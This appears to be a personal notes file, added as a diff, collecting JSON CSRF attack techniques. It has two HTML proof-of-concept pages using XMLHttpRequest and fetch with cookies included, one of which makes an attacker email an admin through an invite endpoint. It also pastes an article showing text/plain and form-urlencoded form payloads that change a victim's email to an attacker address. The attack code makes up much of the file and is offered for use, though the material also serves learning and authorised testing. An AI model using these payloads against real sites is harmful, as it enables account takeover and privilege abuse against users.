@@ -1,0 +1,90 @@
+1.method1: (using fetch or xml request)
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF PoC</title>
+</head>
+<body>
+    <script>
+        var email = "attacker@test.com";
+        var contentType = "text/plain; application/json";var xhr = new XMLHttpRequest();
+        xhr.open("POST", "https://example.com/api/rounds/test_round/admin/invite?email=" + email, true);
+        xhr.setRequestHeader("Content-Type", contentType);
+        xhr.withCredentials = true; // Include cookies
+        var payload = JSON.stringify({});
+        xhr.onload = function () {
+            if (xhr.status >= 200 && xhr.status < 300) {
+                console.log('CSRF request sent successfully');
+            } else {
+                console.error('Failed to send CSRF request');
+            }
+        };
+        xhr.send(payload);
+    </script>
+</body>
+</html>
+
+<html>
+<title>JSON CSRF POC</title>
+<body>
+<center>
+<h1> JSON CSRF POC </h1>
+<script>
+fetch('http://vul-app.com', {method: 'POST', credentials: 'include', headers: {'Content-Type': 'text/plain'}, body: '{"name":"attacker","email":"attacker.com"}'});
+</script>
+<form action="#">
+<input type="button" value="Submit" />
+</form>
+</center>
+</body>
+</html>
+
+2.method2: (using flash,307 redirect):
+
+3.method3:
+https://medium.com/@osamaavvan/json-csrf-to-formdata-attack-eb65272376a2
+-----------------
+So you guys must be aware of CSRF attack, if not then here is a short intro:
+
+CSRF is an attack that forces an end user to execute unwanted actions on a web application in which they’re currently authenticated. CSRF attacks specifically target state-changing requests, CSRF attack can force the user to perform state-changing requests like transferring funds, changing their email address, or even compromise the entire web application.
+
+    Source: https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)
+
+So what’s unique in JSON CSRF, In JSON CSRF the data sent to the server is in JSON format and the Content-Type is Content-Type: application/json, now the problem is that we can’t send Content-Type: application/json, using a regular HTML form, it is only possible through an XMLHTTP Request or in simple words through an AJAX requests to the server, but due to CORS policy we can’t do that unless the server allows over custom Origin and Access-Control-Allow-Credentials: true is set in the response.
+
+    All of this is only possible if there is no Anti-CSRF protection token or some other CSRF protection mechanisim.
+
+Now there is still hope if we change the Content-Type from application/json to text/plain and there are no errors in the response and the form is submitted successfully than we can perform a CSRF Attack by creating an HTML Form with an attribute enctype=”text/plain”.
+
+Now let’s take look at a real-life scenario.
+
+    Here is a JSON request sent to the server for changing User Personal Information.
+
+Now at first, we could test if changing the Content-Type from application/json to text/plain works, if it works and we receive the same results as with application/json and there are no errors we can easily send the JSON Data like this.
+
+    <form action=”https://redact.com/api/rest/model/atg/userprofiling/ProfileActor/updateMyData" method=”post” enctype=”text/plain”>
+
+    <input type=”text” name=’{“id”:”1025275966",”firstName”:”Foo”,”lastName”:”Bar”,”email”:”hacked@gmail.com”,”gender”:”Hombre”,”mobileNumber”:”+52",”countryCode”:”+52",”passwordCheckBox”:”false”,”favoritesListId”:”gl1025526845",”receivePromoEmail”:”No”,”fullName”:”Foo Bar“,”mySaveLaterGiftListId”:”gl1034897755", “balance”:”’ value=’true”}’>
+
+    <input type=”submit” value=”send”>
+    </form>
+
+I have appended the “balance”:”’ value=’true”}’ at the end of the JSON Data to Balance the additional = sent in the request.
+
+Now if the text/plain method is not working then we also have another option, by simply sending the Form Data with Content-Type: application/x-www-form-urlencoded. This is the most common and simplest type of Form submission. Now create an HTML form with all the fields in JSON Data like this.
+
+    <form action=”https://redact.com/api/rest/model/atg/userprofiling/ProfileActor/updateMyData" method=”post”>
+    <input hidden=”true” type=”text” name=”firstName” value=”Foo”>
+    <input hidden=”true” type=”text” name=”lastName” value=”Bar”>
+    <input hidden=”true” type=”text” name=”email” value=”hacked@gmail.com”>
+    <input type=”text” hidden=”true” name=”gender” value=”Mujer”>
+    <input type=”text” name=”mobileNumber” hidden=”true” value=”+521452453698">
+    <input type=”text” name=”countryCode” hidden=”true” value=”+52">
+
+    <input type=”submit” value=”send”>
+
+Submit the form to test if it is working.
+
